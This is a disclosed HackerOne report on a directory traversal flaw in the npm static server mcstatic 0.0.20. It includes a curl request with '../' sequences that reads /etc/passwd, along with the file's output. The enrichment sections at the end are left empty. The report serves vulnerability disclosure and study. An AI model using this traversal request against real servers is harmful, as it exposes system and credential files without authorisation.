---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '330285'
original_report_id: '330285'
title: '[mcstatic] Server Directory Traversal'
weakness: Path Traversal
team_handle: nodejs-ecosystem
created_at: '2018-03-27T09:25:33.344Z'
disclosed_at: '2018-06-12T08:16:18.153Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
asset_identifier: mcstatic
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- path-traversal
---

# [mcstatic] Server Directory Traversal

## Metadata

- HackerOne Report ID: 330285
- Weakness: Path Traversal
- Program: nodejs-ecosystem
- Disclosed At: 2018-06-12T08:16:18.153Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a Server Directory Traversal in **mcstatic**.
It allows reading local files on the target server.

# Module

**module name:** mcstatic
**version:** 0.0.20
**npm page:** `https://www.npmjs.com/package/mcstatic`

## Module Description

Static Http server for mocking and stuff

# Vulnerability

## Steps To Reproduce:

* Install the module

`$ npm i mcstatic`

* Start the server

`$ ./node_modules/mcstatic/bin/mcstatic --port 6060`

* Using the below request to access the file `/etc/passwd` on the target server:

```
$ curl --path-as-is 'http://127.0.0.1:6060/../../../../../../../../../etc/passwd'
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
...
```

## Supporting Material/References:

* node v8.10.0
* npm 5.6.0
* curl 7.54.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

reading local files on the target server

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
